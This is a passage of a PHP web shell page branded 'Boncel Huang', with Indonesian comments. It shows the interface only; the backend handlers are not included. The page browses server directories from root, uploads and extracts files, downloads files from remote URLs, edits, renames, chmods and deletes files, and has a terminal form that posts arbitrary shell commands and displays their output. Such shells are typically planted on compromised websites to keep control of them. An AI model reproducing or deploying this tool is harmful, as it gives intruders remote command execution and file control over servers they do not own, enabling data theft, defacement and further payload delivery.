            background: linear-gradient(135deg, #00ffff, #ff00ff);
            border: none;
            border-radius: 8px;
            color: #000;
            font-weight: bold;
            cursor: pointer;
        }
        
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.3); }
        ::-webkit-scrollbar-thumb { background: linear-gradient(135deg, #00ffff, #ff00ff); border-radius: 4px; }
        
        @media (max-width: 900px) {
            .features-grid { grid-template-columns: repeat(2, 1fr); }
        }
        @media (max-width: 550px) {
            .features-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="bg-animation"></div>
    <div class="cyber-header">
        <div class="header-content">
            <div class="logo-area">
                <div class="logo-icon">⚡</div>
                <div class="logo-text"><h1>Boncel Huang</h1></div>
            </div>
            <div class="nav-buttons">
                <a href="?d=<?php echo urlencode($currentDir); ?>" class="cyber-btn">⟳ REFRESH</a>
                <a href="?logout=1" class="cyber-btn">⍟ LOGOUT</a>
            </div>
        </div>
    </div>
    <div class="container">
        <div class="dir-path">
            📁 CURRENT DIRECTORY: 
            <?php
            $parts = explode('/', trim($currentDir, '/'));
            $current = '';
            echo '<a href="?d=/">[ROOT]</a>';
            foreach ($parts as $part) {
                if ($part) {
                    $current .= '/' . $part;
                    echo ' / <a href="?d=' . urlencode($current) . '">' . htmlspecialchars($part) . '</a>';
                }
            }
            ?>
        </div>
        
        <?php if (!empty($messages)): ?>
        <div class="messages">
            <?php foreach ($messages as $msg): ?>
                <div class="message">⚡ <?php echo htmlspecialchars($msg); ?></div>
            <?php endforeach; ?>
        </div>
        <?php endif; ?>
        
        <!-- 4 CARD FITUR - UKURAN DIPERKECIL -->
        <div class="features-grid">
            <div class="cyber-card">
                <div class="card-title">➕ CREATE ENTITY</div>
                <form method="POST">
                    <input type="text" name="name" placeholder="Name" required>
                    <select name="type">
                        <option value="file">📄 File</option>
                        <option value="folder">📁 Folder</option>
                    </select>
                    <textarea name="content" placeholder="File content" rows="2"></textarea>
                    <button type="submit" name="create_action" value="1">CREATE</button>
                </form>
            </div>
            <div class="cyber-card">
                <div class="card-title">📤 UPLOAD FILES</div>
                <form method="POST" enctype="multipart/form-data">
                    <input type="file" name="files[]" multiple required>
                    <button type="submit">UPLOAD</button>
                </form>
            </div>
            <div class="cyber-card">
                <div class="card-title">📦 EXTRACT ARCHIVE</div>
                <form method="POST" enctype="multipart/form-data">
                    <input type="file" name="archive" accept=".zip" required>
                    <button type="submit">EXTRACT</button>
                </form>
            </div>
            <div class="cyber-card">
                <div class="card-title">🌐 REMOTE DOWNLOAD</div>
                <form method="POST">
                    <input type="url" name="download_url" placeholder="https://..." required>
                    <input type="text" name="download_name" placeholder="Save as">
                    <button type="submit">DOWNLOAD</button>
                </form>
            </div>
        </div>
        
        <div class="file-table">
            <form method="POST" id="deleteForm">
                <table>
                    <thead>
                        <tr><th><input type="checkbox" id="selectAll"></th><th>📁 NAME</th><th>📊 SIZE</th><th>🔧 PERM</th><th>📅 MODIFIED</th><th>⚡ ACTIONS</th></tr>
                    </thead>
                    <tbody>
                        <?php
                        $items = @scandir($currentDir);
                        if ($items) {
                            $dirs = [];
                            $files = [];
                            foreach ($items as $item) {
                                if ($item == '.' || $item == '..') continue;
                                $path = $currentDir . $item;
                                if (is_dir($path)) { $dirs[] = $item; }
                                else { $files[] = $item; }
                            }
                            sort($dirs);
                            sort($files);
                            foreach ($dirs as $item):
                                $path = $currentDir . $item;
                                $perms = substr(sprintf('%o', fileperms($path)), -4);
                                $modified = date('Y-m-d H:i:s', filemtime($path));
                        ?>
                            <tr>
                                <td><input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item); ?>"></td>
                                <td><div class="file-name">📁 <a href="?d=<?php echo urlencode($path); ?>" class="folder-link"><?php echo htmlspecialchars($item); ?></a></div></td>
                                <td>—</td>
                                <td><?php echo $perms; ?></td>
                                <td><?php echo $modified; ?></td>
                                <td class="action-buttons">
                                    <a href="#" onclick="showRenameModal('<?php echo htmlspecialchars(addslashes($item)); ?>')" class="action-btn edit">RENAME</a>
                                    <a href="#" onclick="showChmodModal('<?php echo htmlspecialchars(addslashes($item)); ?>', '<?php echo $perms; ?>')" class="action-btn edit">CHMOD</a>
                                    <a href="?d=<?php echo urlencode($currentDir); ?>&delete=<?php echo urlencode($item); ?>" class="action-btn delete" onclick="return confirm('DELETE FOLDER?')">DELETE</a>
                                </td>
                            </tr>
                        <?php endforeach;
                            foreach ($files as $item):
                                $path = $currentDir . $item;
                                $size = filesize($path);
                                $perms = substr(sprintf('%o', fileperms($path)), -4);
                                $modified = date('Y-m-d H:i:s', filemtime($path));
                                $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                                $icon = '📄';
                                if ($ext == 'php') $icon = '🐘';
                                elseif ($ext == 'html' || $ext == 'htm') $icon = '🌐';
                                elseif ($ext == 'zip') $icon = '📦';
                                elseif ($ext == 'txt') $icon = '📝';
                                elseif (in_array($ext, ['jpg','png','gif','jpeg'])) $icon = '🖼️';
                                $isEditable = $size < 2 * 1024 * 1024 && !in_array($ext, ['zip','jpg','png','gif','jpeg','mp4','mp3','pdf']);
                        ?>
                            <tr>
                                <td><input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item); ?>"></td>
                                <td><div class="file-name"><?php echo $icon; ?> <?php if ($isEditable): ?><a href="?d=<?php echo urlencode($currentDir); ?>&edit=<?php echo urlencode($item); ?>" class="file-link"><?php echo htmlspecialchars($item); ?></a><?php else: ?><span><?php echo htmlspecialchars($item); ?></span><?php endif; ?></div></td>
                                <td><?php echo formatBytes($size); ?></td>
                                <td><?php echo $perms; ?></td>
                                <td><?php echo $modified; ?></td>
                                <td class="action-buttons">
                                    <a href="<?php echo str_replace($_SERVER['DOCUMENT_ROOT'], '', $path); ?>" target="_blank" class="action-btn open">OPEN</a>
                                    <?php if ($isEditable): ?><a href="?d=<?php echo urlencode($currentDir); ?>&edit=<?php echo urlencode($item); ?>" class="action-btn edit">EDIT</a><?php endif; ?>
                                    <?php if ($ext == 'zip'): ?><a href="?d=<?php echo urlencode($currentDir); ?>&extract=<?php echo urlencode($item); ?>" class="action-btn extract">EXTRACT</a><?php endif; ?>
                                    <a href="#" onclick="showRenameModal('<?php echo htmlspecialchars(addslashes($item)); ?>')" class="action-btn edit">RENAME</a>
                                    <a href="#" onclick="showChmodModal('<?php echo htmlspecialchars(addslashes($item)); ?>', '<?php echo $perms; ?>')" class="action-btn edit">CHMOD</a>
                                    <a href="?d=<?php echo urlencode($currentDir); ?>&delete=<?php echo urlencode($item); ?>" class="action-btn delete" onclick="return confirm('DELETE FILE?')">DELETE</a>
                                </td>
                            </tr>
                        <?php endforeach;
                        } ?>
                    </tbody>
                </table>
                <div style="padding: 20px;">
                    <button type="submit" name="delete_selected" value="1" class="delete-selected-btn" onclick="return confirm('DELETE SELECTED ITEMS?')">🗑 DELETE SELECTED</button>
                </div>
            </form>
        </div>
        
        <!-- TERMINAL DI BAWAH -->
        <div class="terminal">
            <div class="terminal-header">💻 GO TERMINAL 🔥</div>
            <form method="POST">
                <div style="padding: 20px;">
                    <input type="text" name="command" placeholder="$ ENTER COMMAND... (contoh: ls -la, cat file.txt, cd folder, wget https://example.com/file.zip)" style="width:100%; padding:12px; background:#000; border:1px solid #00ffff; color:#00ff00; border-radius:8px; font-family:'Courier New', monospace;" autocomplete="off">
                </div>
                <button type="submit" style="margin:0 20px 20px 20px; padding:10px 20px; background:linear-gradient(135deg,#00ffff,#ff00ff); border:none; border-radius:8px; color:#000; font-weight:bold; cursor:pointer;">▶ EXECUTE</button>
            </form>
            <?php if (!empty($commandOutput)): ?>
            <div class="terminal-output"><?php echo htmlspecialchars($commandOutput); ?></div>
            <?php endif; ?>
        </div>
        
        <?php if (isset($editFile)): ?>
        <div class="editor">
            <h3>✏️ EDITING: <?php echo htmlspecialchars($editFile); ?></h3>
            <form method="POST">
                <textarea name="edit_content" spellcheck="false"><?php echo htmlspecialchars($editContent); ?></textarea>
                <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($editFile); ?>">
                <div style="margin-top:15px;">
                    <button type="submit">💾 SAVE CHANGES</button>
                    <a href="?d=<?php echo urlencode($currentDir); ?>" style="margin-left:10px; color:#ff4757;">CANCEL</a>
                </div>
            </form>
        </div>
        <?php endif; ?>
    </div>
    
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <h3>✏️ RENAME ENTITY</h3>
            <form method="POST">
                <input type="hidden" name="rename_old" id="renameOld">
                <input type="text" name="rename_new" id="renameNew" placeholder="New name" required>
                <button type="submit">RENAME</button>
                <button type="button" onclick="closeModal('renameModal')" style="margin-left:10px;">CANCEL</button>
            </form>
        </div>
    </div>
    
    <div id="chmodModal" class="modal">
        <div class="modal-content">
            <h3>🔧 CHANGE PERMISSIONS</h3>
            <form method="POST">
                <input type="hidden" name="chmod_file" id="chmodFile">
                <input type="text" name="chmod_value" id="chmodValue" placeholder="e.g., 0755" required>
                <button type="submit">APPLY</button>
                <button type="button" onclick="closeModal('chmodModal')" style="margin-left:10px;">CANCEL</button>
            </form>
        </div>
    </div>
    
    <script>
        // ========== SCROLL KE ATAS SAAT REFRESH ==========
        (function() {
            // Deteksi refresh/reload
            if (performance.navigation.type === 1 || 
                (window.performance.getEntriesByType && 
                 window.performance.getEntriesByType("navigation")[0]?.type === "reload")) {
                window.scrollTo(0, 0);
            }
            // Setiap load halaman, scroll ke atas
            window.addEventListener('DOMContentLoaded', function() {
                window.scrollTo(0, 0);
            });
        })();
        // ========== AKHIR SCROLL KE ATAS ==========
        
        document.getElementById('selectAll')?.addEventListener('change', function(e) {
            document.querySelectorAll('input[name="selected_items[]"]').forEach(cb => cb.checked = e.target.checked);
        });
        function showRenameModal(name) {
            document.getElementById('renameOld').value = name;
            document.getElementById('renameNew').value = name;
            document.getElementById('renameModal').style.display = 'flex';
        }
        function showChmodModal(name, currentPerm) {
            document.getElementById('chmodFile').value = name;
            document.getElementById('chmodValue').value = currentPerm;
            document.getElementById('chmodModal').style.display = 'flex';
        }
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                event.target.style.display = 'none';
            }
        }
        setTimeout(() => {
            document.querySelectorAll('.message').forEach(msg => {
                msg.style.opacity = '0';
                setTimeout(() => msg.remove(), 500);
            });
        }, 5000);
        document.querySelector('input[name="command"]')?.focus();
    </script>
</body>
</html>
